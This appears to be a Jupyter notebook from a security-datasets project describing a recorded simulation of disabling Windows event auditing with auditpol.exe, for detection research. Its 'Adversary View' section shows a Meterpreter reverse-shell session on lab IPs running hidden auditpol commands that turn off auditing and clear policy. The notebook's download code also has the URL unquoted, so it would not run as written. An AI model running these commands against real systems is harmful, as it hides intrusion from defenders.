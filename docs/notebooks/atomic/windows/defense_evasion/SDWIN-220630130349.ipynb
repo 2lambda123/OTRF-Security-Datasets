{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4c98ec44",
   "metadata": {},
   "source": [
    "# Disabling Windows Event Logging via Audit Policy Modification"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56e0750c",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5e0ac43d",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Jose Rodriguez @Cyb3rPandaH |\n",
    "| Creation Date     | 2022/06/30 |\n",
    "| Modification Date | 2022/08/18 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1562.002](https://attack.mitre.org/techniques/T1562/002) |\n",
    "| Tags              | auditpol,cmd,microsoft windows security auditing |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "426b4d82",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "After getting a shell with elevated privileges on the target, we used auditpol.exe to modify the current system and user audit policies.\n",
    "Success and failure events were disabled using the /set /remove /clear commands and /success /failure parameters.\n",
    "This dataset was generated using a Windows 10 Pro edition (Version:1903,OS Build:18362.30) and Kali Linux (Version:2022.2)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2c04b1f4",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f6fcbe1",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/auditpol_system_user_auditpolicy_modification.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/auditpol_system_user_auditpolicy_modification.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a1ff6fb1",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a802cd35",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2172db7c",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | auditpol.exe | [auditpol.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "daf77f8c",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "msf6 exploit(multi/handler) > run \n",
    "[*] Started HTTPS reverse handler on https://192.168.56.40:8443 \n",
    "[*] https://192.168.56.40:8443 handling request from 192.168.56.44; (UUID: gytdwvr9) Staging x64 payload (201308 bytes) ... \n",
    "[*] Meterpreter session 3 opened (192.168.56.40:8443 -> 127.0.0.1 ) at 2022-08-18 09:56:27 -0400 \n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /user:pedro /category:\"DS Access\" /success:disable' \n",
    "Process 4392 created.\n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /user:pedro /category:\"DS Access\" /failure:disable' \n",
    "Process 6664 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/remove /user:pedro' \n",
    "Process 4440 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /category:\"Account Logon\" /success:disable' \n",
    "Process 472 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/set /category:\"Account Logon\" /failure:disable' \n",
    "Process 2752 created. \n",
    "meterpreter > execute -f auditpol.exe -H -a '/clear /y' \n",
    "Process 7016 created. \n",
    "meterpreter > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a32d7d0b",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5dc2b5dc",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ed162cb",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/auditpol_system_user_auditpolicy_modification.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c7a752f",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74506590",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2c6f7da",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "81ecd435",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c29581db",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) \n",
    "* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
